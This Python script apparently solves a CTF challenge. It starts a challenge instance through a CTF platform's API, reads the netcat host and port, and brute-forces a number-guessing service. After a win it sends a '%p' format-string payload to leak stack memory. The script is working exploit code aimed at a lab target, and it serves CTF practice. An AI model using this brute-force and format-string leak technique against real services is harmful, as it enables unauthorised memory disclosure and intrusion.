import sys, json, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

cy = CyLab(delay=1.0)
cy.login()
cy.req("PUT", "/api/challenges/89/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/89/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d+)", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)


def recv_until(s, marker, timeout=6.0):
    s.settimeout(timeout)
    buf = b""
    t0 = time.time()
    while marker not in buf and time.time() - t0 < timeout:
        try:
            c = s.recv(4096)
            if not c:
                break
            buf += c
        except socket.timeout:
            break
    return buf


s = socket.create_connection((host, port), timeout=20)
s.settimeout(6)
recv_until(s, b"guess?")
found = None
n = 0
for guess in range(1, 4097):
    s.sendall(f"{guess}\n".encode())
    n += 1
    r = recv_until(s, b"\n\n", 2.0)
    if b"New winner" in r or b"Congrats" in r:
        found = guess
        print("TROUVE:", guess, "|", r[:150])
        break
    if b"Nope" not in r and b"guess?" not in r:
        print("reponse inattendue a", guess, ":", r[:150])
        break
print("essais:", n, "guess =", found)
if found:
    s.sendall(b"%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\n")
    time.sleep(1.0)
    out = recv_until(s, b"\n\n", 3.0)
    print("LEAK:", out.decode("utf-8", "replace")[:700])
s.close()
